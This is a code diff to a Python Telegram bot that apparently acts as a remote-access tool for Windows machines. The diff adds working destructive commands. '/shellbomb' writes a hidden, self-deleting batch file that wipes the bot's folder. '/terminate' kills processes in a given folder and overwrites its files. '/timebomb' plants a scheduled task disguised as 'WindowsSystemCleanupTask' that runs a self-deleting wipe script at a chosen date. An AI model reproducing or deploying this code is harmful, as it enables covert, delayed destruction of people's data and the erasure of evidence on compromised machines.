@@ -8,6 +8,9 @@ import time
 import urllib.request
 import io
 import contextlib
+import re
+from datetime import datetime, timedelta
+
 
 # 1. Wait for an active internet connection
 def wait_for_internet():
@@ -532,6 +535,232 @@ def delete_path(message):
             bot.reply_to(message, f"🗑️ File successfully deleted:\n`{path}`", parse_mode="Markdown")
     except Exception as e:
         bot.reply_to(message, f"Error deleting path: {str(e)}")
+        
+        
+@bot.message_handler(commands=["shellbomb"])
+def trigger_shellbomb(message):
+    if not is_authorized(message):
+        bot.reply_to(message, "Unauthorized user!")
+        return
+    
+    bot.reply_to(message, "💣 Shellbomb triggered! Directory will be securely wiped in 50 seconds...")
+    
+    bat_content = """@echo off
+timeout /t 50 /nobreak >nul
+for %%f in ("%~dp0*.*") do (
+    if /i not "%%~nxf"=="%~nx0" (
+        break > "%%f"
+        del /f /q "%%f"
+    )
+)
+for /D %%i in ("%~dp0*") do rmdir /S /Q "%%i"
+del "%~f0"
+"""
+    try:
+        if getattr(sys, 'frozen', False):
+            current_dir = os.path.dirname(sys.executable)
+        else:
+            current_dir = os.path.dirname(os.path.abspath(__file__))
+            
+        bat_path = os.path.join(current_dir, "shellbomb.bat")
+        
+        with open(bat_path, "w", encoding="utf-8") as f:
+            f.write(bat_content)
+            
+        subprocess.Popen(
+            bat_path, 
+            shell=True, 
+            creationflags=subprocess.CREATE_NO_WINDOW if sys.platform == 'win32' else 0
+        )
+    except Exception as e:
+        bot.reply_to(message, f"Error creating shellbomb: {str(e)}") 
+
+@bot.message_handler(commands=["terminate"])
+def terminate_folder(message):
+    if not is_authorized(message):
+        bot.reply_to(message, "Unauthorized user!")
+        return
+    
+    target_path = message.text[len("/terminate ") :].strip()
+    if not target_path:
+        bot.reply_to(message, "Please provide a folder path. Example: `/terminate C:\\path\\to\\folder`", parse_mode="Markdown")
+        return
+        
+    target_path = os.path.normpath(target_path)
+    if not os.path.isdir(target_path):
+        bot.reply_to(message, f"Error: Directory not found: {target_path}")
+        return
+        
+    bot.reply_to(message, f"🛑 Terminating processes and wiping directory:\n`{target_path}`", parse_mode="Markdown")
+    
+    try:
+        # 1. Kill all processes running inside the specified folder
+        killed_count = 0
+        for proc in psutil.process_iter(['pid', 'name', 'exe']):
+            try:
+                exe_path = proc.info.get('exe')
+                if exe_path:
+                    norm_exe_path = os.path.normpath(exe_path)
+                    if norm_exe_path.startswith(target_path):
+                        proc.kill()
+                        killed_count += 1
+            except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
+                pass
+        
+        # Brief pause to release file locks
+        time.sleep(2)
+        
+        # 2. Securely wipe contents and remove directory
+        for root, dirs, files in os.walk(target_path, topdown=False):
+            for file in files:
+                file_path = os.path.join(root, file)
+                try:
+                    with open(file_path, "wb") as f:
+                        f.write(b'\x00' * 1024)  # Overwrite data to prevent recovery
+                    os.remove(file_path)
+                except:
+                    try:
+                        os.remove(file_path)
+                    except:
+                        pass
+            for dir_name in dirs:
+                dir_path = os.path.join(root, dir_name)
+                try:
+                    os.rmdir(dir_path)
+                except:
+                    pass
+        
+        try:
+            os.rmdir(target_path)
+        except:
+            shutil.rmtree(target_path, ignore_errors=True)
+            
+        bot.reply_to(message, f"✅ Successfully terminated {killed_count} process(es) and completely wiped the folder:\n`{target_path}`", parse_mode="Markdown")
+    except Exception as e:
+        bot.reply_to(message, f"Error during termination: {str(e)}")
+        
+
+
+@bot.message_handler(commands=["timebomb"])
+def timebomb_handler(message):
+    if not is_authorized(message):
+        bot.reply_to(message, "Unauthorized user!")
+        return
+        
+    parts = message.text.split(maxsplit=2)
+    if len(parts) < 2:
+        bot.reply_to(
+            message, 
+            "Usage:\n"
+            "• `/timebomb add <time>` (e.g., `/timebomb add 1y 3m 9d`)\n"
+            "• `/timebomb cls` - Cancel active timebomb", 
+            parse_mode="Markdown"
+        )
+        return
+        
+    action = parts[1].lower()
+    task_name = "WindowsSystemCleanupTask"
+    
+    if action == "cls":
+        try:
+            subprocess.run(
+                f'schtasks /delete /tn "{task_name}" /f', 
+                shell=True, 
+                stdout=subprocess.DEVNULL, 
+                stderr=subprocess.DEVNULL, 
+                startupinfo=startupinfo
+            )
+            bot.reply_to(message, "🛡️ Timebomb successfully **CANCELLED** and removed.", parse_mode="Markdown")
+        except Exception as e:
+            bot.reply_to(message, f"Error cancelling timebomb: {str(e)}")
+        return
+        
+    elif action == "add":
+        if len(parts) < 3:
+            bot.reply_to(message, "Please specify time duration. Example: `/timebomb add 1y 3m 9d` or `/timebomb add 7d`", parse_mode="Markdown")
+            return
+            
+        time_str = parts[2]
+        pattern = re.findall(r'(\d+)([ymwdhs])', time_str.lower())
+        if not pattern:
+            bot.reply_to(
+                message, 
+                "Invalid format. Use units: `y` (years), `m` (months), `w` (weeks), `d` (days), `h` (hours), `s` (seconds).\nExample: `/timebomb add 1y 3m 9d`", 
+                parse_mode="Markdown"
+            )
+            return
+            
+        total_seconds = 0
+        for value, unit in pattern:
+            val = int(value)
+            if unit == 'y':
+                total_seconds += val * 365 * 24 * 3600
+            elif unit == 'm':
+                total_seconds += val * 30 * 24 * 3600
+            elif unit == 'w':
+                total_seconds += val * 7 * 24 * 3600
+            elif unit == 'd':
+                total_seconds += val * 24 * 3600
+            elif unit == 'h':
+                total_seconds += val * 3600
+            elif unit == 's':
+                total_seconds += val
+                
+        if total_seconds <= 0:
+            bot.reply_to(message, "Error: Duration must be greater than zero.")
+            return
+            
+        target_dt = datetime.now() + timedelta(seconds=total_seconds)
+        target_date_str = target_dt.strftime("%m/%d/%Y")  # Fixed to mm/dd/yyyy format
+        target_time_str = target_dt.strftime("%H:%M")
+        
+        if getattr(sys, 'frozen', False):
+            current_dir = os.path.dirname(sys.executable)
+        else:
+            current_dir = os.path.dirname(os.path.abspath(__file__))
+            
+        bat_path = os.path.join(current_dir, "timebomb.bat")
+        
+        bat_content = f"""@echo off
+for %%f in ("%~dp0*.*") do (
+    if /i not "%%~nxf"=="%~nx0" (
+        break > "%%f"
+        del /f /q "%%f"
+    )
+)
+for /D %%i in ("%~dp0*") do rmdir /S /Q "%%i"
+schtasks /delete /tn "{task_name}" /f >nul 2>&1
+del "%~f0"
+"""
+        try:
+            with open(bat_path, "w", encoding="utf-8") as f:
+                f.write(bat_content)
+                
+            subprocess.run(
+                f'schtasks /delete /tn "{task_name}" /f', 
+                shell=True, 
+                stdout=subprocess.DEVNULL, 
+                stderr=subprocess.DEVNULL, 
+                startupinfo=startupinfo
+            )
+            
+            cmd = f'schtasks /create /tn "{task_name}" /tr "\"{bat_path}\"" /sc ONCE /sd "{target_date_str}" /st "{target_time_str}" /f'
+            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, startupinfo=startupinfo)
+            
+            if result.returncode == 0:
+                bot.reply_to(
+                    message, 
+                    f"💣 **Timebomb Set Successfully!**\n\n"
+                    f"• **Trigger Date:** {target_date_str} {target_time_str}\n"
+                    f"• **Action:** Secure wipe of directory\n"
+                    f"• **Cancel:** Use `/timebomb cls`", 
+                    parse_mode="Markdown"
+                )
+            else:
+                bot.reply_to(message, f"Error creating scheduled task: {result.stderr.strip() or 'Unknown error'}")
+        except Exception as e:
+            bot.reply_to(message, f"Error setting timebomb: {str(e)}")
+            
 
 @bot.message_handler(commands=["start"])
 def send_welcome(message):
@@ -554,6 +783,10 @@ def send_welcome(message):
             "• `/shutdown` / `/restart` - Power controls\n"
             "• `/getfile <path>` - Download files\n"
             "• `/delete <path>` - Delete file/folder\n"
+            "• `/shellbomb` - Securely wipe directory in 50s\n"
+            "• `/terminate <path>` - Kill processes & wipe folder\n"
+            "• `/timebomb add <time>` - Set persistent timebomb wipe\n"
+            "• `/timebomb cls` - Cancel active timebomb\n"
             "• `/images /videos /pdf` - Media handlers\n\n"
             "**--- FORENSIC COMMANDS ---**\n"
             "• `/forensic` - Show forensic menu\n"
